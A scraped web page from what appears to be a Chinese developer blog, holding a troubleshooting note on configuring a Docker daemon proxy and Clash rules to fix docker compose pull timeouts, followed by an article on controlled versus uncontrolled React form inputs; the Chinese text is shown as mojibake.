code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Compose Pull è¶…æ—¶ä¸ä»£ç†è¸©å‘è®°å½•</h2>
<h3 data-id="heading-1">é—®é¢˜ä¸€ï¼šdocker compose pull ç›´æ¥è¶…æ—¶</h3>
<h4 data-id="heading-2">æŠ¥é”™</h4>
<pre><code class="hljs language-bash" lang="bash">&gt; docker compose pull
Error response from daemon: Get <span class="hljs-string">"https://registry-1.docker.io/v2/"</span>: dial tcp 108.160.170.33:443: i/o <span class="hljs-built_in">timeout</span> (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)
</code></pre>
<h4 data-id="heading-3">åŸå› </h4>
<p>Docker daemon æ— æ³•ç›´è¿ Docker Hubï¼ˆå›½å†…ç½‘ç»œè¢«é˜»æ–­ï¼‰ã€‚</p>
<h4 data-id="heading-4">è§£å†³åŠæ³•</h4>
<p>ç»™ Docker é…ä»£ç†ï¼Œè®© daemon èµ°ä»£ç†è®¿é—®å¤–ç½‘ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d
sudo vi /etc/systemd/system/docker.service.d/proxy.conf
</code></pre>
<p>å†…å®¹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Service]</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"HTTP_PROXY=http://172.24.48.1:7890"</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"HTTPS_PROXY=http://172.24.48.1:7890"</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"NO_PROXY=localhost,172.24.48.1"</span>
</code></pre>
<p>ç„¶å</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl daemon-reload
sudo systemctl restart docker
</code></pre>
<h3 data-id="heading-5">é—®é¢˜äºŒï¼šé…ç½®ä»£ç†åä»ç„¶å¤±è´¥</h3>
<h4 data-id="heading-6">æŠ¥é”™</h4>
<pre><code class="hljs language-bash" lang="bash">&gt; docker compose pull
Error response from daemon: Get <span class="hljs-string">"https://registry-1.docker.io/v2/"</span>: <span class="hljs-built_in">read</span> tcp 172.24.48.247:60752-&gt;172.24.48.1:7890: <span class="hljs-built_in">read</span>: connection reset by peer
</code></pre>
<h4 data-id="heading-7">å®šä½æ–¹å¼</h4>
<pre><code class="hljs language-bash" lang="bash">curl -I https://registry-1.docker.io/v2/ --proxy http://172.24.48.1:7890
</code></pre>
<h4 data-id="heading-8">ç»“æœ</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> Connection established 
<span class="hljs-symbol">curl:</span> (<span class="hljs-number">35</span>) OpenSSL SSL_connect: Connection reset <span class="hljs-keyword">by</span> peer <span class="hljs-keyword">in</span> connection <span class="hljs-keyword">to</span> registry-<span class="hljs-number">1</span>.docker.io:<span class="hljs-number">443</span>
</code></pre>
<h4 data-id="heading-9">åŸå› </h4>
<p>dockeråŸŸåæ²¡æœ‰è®¾ç½®ä»£ç†è§„åˆ™ï¼Œèµ°äº†ç›´è¿</p>
<h4 data-id="heading-10">è§£å†³åŠæ³•</h4>
<p>åœ¨ä»£ç†ï¼ˆå¦‚ Clashï¼‰ä¸­å¼ºåˆ¶ Docker Hub èµ°ä»£ç†</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">rules:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,registry-1.docker.io,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,auth.docker.io,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,docker.com,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,docker.io,PROXY</span>
</code></pre>
<p>é‡å¯ Clashï¼Œå†è¯•</p>
<h3 data-id="heading-11">æœ€ç»ˆéªŒè¯</h3>
<pre><code class="hljs language-bash" lang="bash">curl -I https://registry-1.docker.io/v2/ --proxy http://172.24.48.1:7890
<span class="hljs-comment"># æˆåŠŸ</span>

docker compose pull
<span class="hljs-comment"># æˆåŠŸ</span>
</code></pre>
<h3 data-id="heading-12">ä¼˜åŒ–</h3>
<ol>
<li>ä¸ºé¿å…æ¯æ¬¡æ‹‰å–æ–°çš„clashé…ç½®æ—¶é‡ç½®è‡ªå®šä¹‰ rulesï¼Œå°†ä¸Šè¿° docker rules è®¾ç½®åˆ° mixins ä¸­</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">parse</span> = <span class="hljs-function">(<span class="hljs-params">{ content, name, url }, { yaml, axios, notify }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> rules = [
    <span class="hljs-comment">// ...</span>

    <span class="hljs-comment">// docker</span>
    <span class="hljs-string">"DOMAIN-SUFFIX,docker.com,PROXY"</span>,
    <span class="hljs-string">"DOMAIN-SUFFIX,docker.io,PROXY"</span>,
    <span class="hljs-string">"DOMAIN,registry-1.docker.io,PROXY"</span>,
    <span class="hljs-string">"DOMAIN,auth.docker.io,PROXY"</span>
  ]
  content.<span class="hljs-property">rules</span>.<span class="hljs-title function_">unshift</span>(...rules)
  <span class="hljs-keyword">return</span> content
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React è¡¨å•çš„æ§åˆ¶æ¬²ï¼šä»€ä¹ˆæ—¶å€™æˆ‘ä»¬çœŸå¾—æ§åˆ¶å®ƒäº†ï¼Œä»€ä¹ˆæ—¶å€™è¯¥æ”¾å…»äº†ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589962224795795494</link>    <guid>https://juejin.cn/post/7589962224795795494</guid>    <pubDate>2026-01-02T06:56:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795795494" data-draft-id="7589958976226574346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React è¡¨å•çš„æ§åˆ¶æ¬²ï¼šä»€ä¹ˆæ—¶å€™æˆ‘ä»¬çœŸå¾—æ§åˆ¶å®ƒäº†ï¼Œä»€ä¹ˆæ—¶å€™è¯¥æ”¾å…»äº†ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2026-01-02T06:56:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çƒŸè¢…ç ´è¾°"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React è¡¨å•çš„æ§åˆ¶æ¬²ï¼šä»€ä¹ˆæ—¶å€™æˆ‘ä»¬çœŸå¾—æ§åˆ¶å®ƒäº†ï¼Œä»€ä¹ˆæ—¶å€™è¯¥æ”¾å…»äº†ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çƒŸè¢…ç ´è¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:56:10.000Z" title="Fri Jan 02 2026 06:56:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å†™ React ä»£ç æ—¶ï¼Œä½ æœ‰æ²¡æœ‰è¿‡è¿™æ ·çš„å›°æƒ‘ï¼š</p>
<blockquote>
<p>æˆ‘åªæ˜¯æƒ³è®©ç”¨æˆ·è¾“å…¥ä¸€æ®µæ–‡å­—ï¼Œç„¶åæäº¤ã€‚<br/>
ä¸ºä»€ä¹ˆéè¦æä¸ª <code>useState</code> æ¥ç®¡ç†å®ƒï¼Ÿ<br/>
ç”¨ <code>ref</code> ç›´æ¥è¯»å– DOM å€¼ä¸è¡Œå—ï¼Ÿ</p>
</blockquote>
<p>å¦‚æœä½ ä¹Ÿè¿™æ ·æƒ³è¿‡ï¼Œé‚£ä½ ä¸æ˜¯ä¸€ä¸ªäººã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠä¸€èŠè¿™ä¸ªçœ‹ä¼¼ç®€å•ã€å®åˆ™æ·±è—ç„æœºçš„é—®é¢˜ï¼š<strong>React ä¸­çš„å—æ§ç»„ä»¶å’Œéå—æ§ç»„ä»¶ï¼Œåˆ°åº•è¯¥é€‰è°ï¼Ÿ</strong></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€é—®é¢˜çš„èµ·ç‚¹ï¼šæˆ‘è¯¥å¦‚ä½•è·å–è¡¨å•å€¼ï¼Ÿ</h2>
<p>æœ€åŸå§‹çš„éœ€æ±‚æ˜¯ï¼š<strong>ç”¨æˆ·è¾“å…¥å†…å®¹ â†’ ç‚¹å‡»æäº¤ â†’ è·å–è¾“å…¥å†…å®¹</strong>ã€‚</p>
<p>è¿™å¬èµ·æ¥å¾ˆç®€å•ï¼Œä½†å®ç°æ–¹å¼å´æœ‰ä¸¤æ¡è·¯ï¼š</p>
<ul>
<li><strong>æ–¹æ¡ˆA</strong>ï¼šç»™ <code>&lt;input&gt;</code> åŠ ä¸€ä¸ª <code>value</code> å±æ€§ï¼Œå¹¶é€šè¿‡ <code>onChange</code> æ›´æ–°çŠ¶æ€ã€‚</li>
<li><strong>æ–¹æ¡ˆB</strong>ï¼šä¸è®¾ç½® <code>value</code>ï¼Œåªç”¨ <code>ref</code> åœ¨æäº¤æ—¶è¯»å– DOM çš„ <code>.value</code>ã€‚</li>
</ul>
<p>æˆ‘ä»¬å…ˆçœ‹ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[value, setValue]</span> = useState('')<span class="hljs-comment">;</span>
const <span class="hljs-attr">inputRef</span> = useRef(null)<span class="hljs-comment">;</span>

const <span class="hljs-attr">doLogin</span> = (e) =&gt; {
  e.preventDefault()<span class="hljs-comment">;</span>
  console.log(inputRef.current.value)<span class="hljs-comment">; // ä» DOM è¯»å€¼</span>
}<span class="hljs-comment">;</span>

return (
  &lt;form <span class="hljs-attr">onSubmit</span>={doLogin}&gt;
    &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> value={value} <span class="hljs-literal">on</span>Change={(e) =&gt; setValue(e.target.value)} /&gt;
    &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> ref={inputRef} /&gt;
    &lt;button <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;ç™»å½•&lt;/button&gt;
  &lt;/form&gt;
)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ®µä»£ç é‡Œæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ï¼š</p>
<ul>
<li>ç¬¬ä¸€ä¸ªæ˜¯å—æ§çš„ï¼ˆ<code>value={value}</code>ï¼‰</li>
<li>ç¬¬äºŒä¸ªæ˜¯éå—æ§çš„ï¼ˆ<code>ref={inputRef}</code>ï¼‰</li>
</ul>
<p>å½“ä½ ç‚¹å‡»â€œç™»å½•â€ï¼Œä½ ä¼šçœ‹åˆ°ä¸¤ä¸ªå€¼éƒ½è¢«æ‰“å°å‡ºæ¥ â€”â€” ä½†å®ƒä»¬çš„æ¥æºå®Œå…¨ä¸åŒã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€æ€è€ƒï¼šä¸ºä»€ä¹ˆéœ€è¦â€œæ§åˆ¶â€ï¼Ÿ</h2>
<p>æˆ‘ä»¬å…ˆé—®è‡ªå·±ä¸€ä¸ªé—®é¢˜ï¼š</p>
<blockquote>
<p>å¦‚æœæˆ‘ä¸ç”¨ <code>state</code> æ§åˆ¶è¾“å…¥æ¡†ï¼Œè€Œæ˜¯ç›´æ¥è¯» DOMï¼Œæ˜¯ä¸æ˜¯æ›´çœäº‹ï¼Ÿ</p>
</blockquote>
<p>çœ‹èµ·æ¥æ˜¯çš„ã€‚ä»£ç å°‘ï¼Œé€»è¾‘æ¸…æ™°ï¼Œè¿˜èƒ½é¿å…çŠ¶æ€åŒæ­¥çš„é—®é¢˜ã€‚</p>
<p>ä½†è¿™é‡Œæœ‰ä¸€ä¸ªå…³é”®çš„è®¤çŸ¥åå·®ï¼š<strong>æˆ‘ä»¬ä»¥ä¸ºâ€œè¯»å–å€¼â€åªéœ€è¦ä¸€æ¬¡æ“ä½œï¼Œä½†å®é™…ä¸Šï¼Œç”¨æˆ·çš„äº¤äº’æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ã€‚</strong></p>
<h3 data-id="heading-2">ğŸŒªï¸ æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼š</h3>
<p>ä½ åœ¨åšä¸€ä¸ªç™»å½•è¡¨å•ï¼Œè¦æ±‚å¯†ç è‡³å°‘ 6 ä½ï¼Œä¸”åŒ…å«æ•°å­—ã€‚</p>
<p>å¦‚æœä½¿ç”¨éå—æ§ç»„ä»¶ï¼Œä½ åªèƒ½åœ¨æäº¤æ—¶åˆ¤æ–­æ˜¯å¦ç¬¦åˆè§„åˆ™ã€‚<br/>
ä½†å¦‚æœç”¨æˆ·è¾“å…¥äº† <code>abc123</code>ï¼Œç³»ç»Ÿæç¤ºâ€œå¤ªçŸ­äº†â€ï¼Œç„¶åä»–ç»§ç»­æ‰“ <code>456</code>ï¼Œå˜æˆ <code>abc123456</code>ï¼Œè¿™æ—¶å€™ä½ æ‰å‘ç°åˆæ ¼ã€‚</p>
<p>é—®é¢˜æ˜¯ï¼š<strong>ä½ æ€ä¹ˆçŸ¥é“ä»–åœ¨ä¸­é—´æ”¹äº†å¤šå°‘æ¬¡ï¼Ÿæ€ä¹ˆå®æ—¶åé¦ˆï¼Ÿ</strong></p>
<p>è€Œå—æ§ç»„ä»¶å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input
  <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
  <span class="hljs-attr">value</span>={form.password}
  <span class="hljs-attr">onChange</span>={(e) =&gt; {
    const <span class="hljs-attr">pwd</span> = e.target.value<span class="hljs-comment">;</span>
    setForm({ ...form, password: pwd })<span class="hljs-comment">;</span>
    if (pwd.length &gt;= 6 &amp;&amp; /\d/.test(pwd)) {
      setValid(true)<span class="hljs-comment">;</span>
    } else {
      setValid(false)<span class="hljs-comment">;</span>
    }
  }}
/&gt;
</code></pre>
<p>è¿™å°±æ˜¯â€œæ§åˆ¶â€çš„ä»·å€¼ï¼š<strong>æŠŠæ•°æ®æµä»â€œè¢«åŠ¨å“åº”â€å˜æˆâ€œä¸»åŠ¨é©±åŠ¨â€ã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€å†æ·±å…¥ä¸€æ­¥ï¼šä»€ä¹ˆæ˜¯â€œå—æ§â€ï¼Ÿ</h2>
<p>å¾ˆå¤šäººè¯¯ä»¥ä¸ºâ€œå—æ§â€å°±æ˜¯â€œåŠ äº†ä¸ª <code>value</code>â€ï¼Œå…¶å®ä¸ç„¶ã€‚</p>
<p>çœŸæ­£çš„â€œå—æ§â€æ˜¯ä¸€ç§<strong>è®¾è®¡ç†å¿µ</strong>ï¼š</p>
<blockquote>
<p>æ‰€æœ‰çš„ UI çŠ¶æ€éƒ½ç”± React çš„ state é©±åŠ¨ï¼Œè€Œä¸æ˜¯ç”± DOM è‡ªè¡Œå†³å®šã€‚</p>
</blockquote>
<p>è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>è¾“å…¥æ¡†çš„å€¼æ¥è‡ª <code>state</code></li>
<li>ç”¨æˆ·è¾“å…¥è§¦å‘äº‹ä»¶ï¼Œæ›´æ–° <code>state</code></li>
<li>é¡µé¢é‡æ–°æ¸²æŸ“ï¼Œæ˜¾ç¤ºæ–°çš„å€¼</li>
</ul>
<p>è¿™æ˜¯ä¸€ä¸ªé—­ç¯ï¼Œå½¢æˆäº†<strong>å•å‘æ•°æ®æµ</strong>ã€‚</p>
<p>è¿™ç§æ¨¡å¼çš„å¥½å¤„åœ¨äºï¼š</p>
<ul>
<li>æ•°æ®å¯é¢„æµ‹ï¼ˆä¸ä¼šå‡ºç°â€œé¡µé¢æ˜¾ç¤º Aï¼Œå®é™…æ˜¯ Bâ€çš„é—®é¢˜ï¼‰</li>
<li>å¯ä»¥åœ¨ä»»æ„æ—¶åˆ»è¿›è¡Œæ ¡éªŒã€é‡ç½®ã€ä¿å­˜</li>
<li>æ›´å®¹æ˜“æµ‹è¯•å’Œè°ƒè¯•</li>
</ul>
<p>è€Œ <code>ref</code> è™½ç„¶èƒ½æ‹¿åˆ°å€¼ï¼Œä½†å®ƒç»•è¿‡äº† React çš„çŠ¶æ€ç³»ç»Ÿï¼Œå±äºâ€œé»‘ç®±æ“ä½œâ€ã€‚</p>
<hr/>
<h2 data-id="heading-4">å››ã€é‚£ä»€ä¹ˆæ—¶å€™è¯¥â€œæ”¾æ‰‹â€ï¼Ÿ</h2>
<p>æ—¢ç„¶å—æ§è¿™ä¹ˆå¥½ï¼Œä¸ºä»€ä¹ˆè¿˜è¦æœ‰éå—æ§ç»„ä»¶ï¼Ÿ</p>
<p>å› ä¸ºæœ‰äº›åœºæ™¯ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦â€œæ§åˆ¶â€ã€‚</p>
<p>æ¯”å¦‚è¯„è®ºæ¡†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">textareaRef</span> = useRef(null)<span class="hljs-comment">;</span>

const <span class="hljs-attr">handleSubmit</span> = () =&gt; {
  const <span class="hljs-attr">comment</span> = textareaRef.current.value<span class="hljs-comment">;</span>
  if (!comment) {
    alert('è¯·è¾“å…¥è¯„è®º')<span class="hljs-comment">;</span>
    return<span class="hljs-comment">;</span>
  }
  console.log(comment)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>ç”¨æˆ·è¾“å…¥å®Œå°±æäº¤</li>
<li>ä¸éœ€è¦å®æ—¶æ ¡éªŒ</li>
<li>ä¸éœ€è¦è”åŠ¨å…¶ä»–å­—æ®µ</li>
<li>ä¹Ÿä¸éœ€è¦é¢„è§ˆæˆ–è‡ªåŠ¨è¡¥å…¨</li>
</ul>
<p>è¿™æ—¶å€™ï¼Œç”¨ <code>ref</code> æ˜¯ä¸€ç§<strong>è½»é‡çº§çš„é€‰æ‹©</strong>ã€‚</p>
<p>è€Œä¸”ï¼Œåœ¨æŸäº›æ€§èƒ½æ•æ„Ÿçš„åœºæ™¯ä¸‹ï¼Œé¢‘ç¹è§¦å‘ <code>setState</code> ä¼šå½±å“æ€§èƒ½ã€‚ä¾‹å¦‚æ–‡ä»¶ä¸Šä¼ ã€å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ç­‰ï¼Œè¿™äº›ç»„ä»¶å†…éƒ¨æœ‰è‡ªå·±çš„çŠ¶æ€ç®¡ç†æœºåˆ¶ï¼Œå¼ºè¡Œç”¨ React æ§åˆ¶åè€Œä¼šå¢åŠ å¤æ‚åº¦ã€‚</p>
<hr/>
<h2 data-id="heading-5">äº”ã€ç»“è®ºï¼šä¸æ˜¯é€‰æ‹©é¢˜ï¼Œè€Œæ˜¯æƒè¡¡é¢˜</h2>
<p>å›åˆ°æœ€åˆçš„é—®é¢˜ï¼š<strong>æˆ‘åº”è¯¥ç”¨å—æ§è¿˜æ˜¯éå—æ§ï¼Ÿ</strong></p>
<p>ç­”æ¡ˆä¸æ˜¯â€œå“ªä¸ªæ›´å¥½â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>æ ¹æ®ä¸šåŠ¡éœ€æ±‚åšæƒè¡¡ã€‚</strong></p>
</blockquote>



































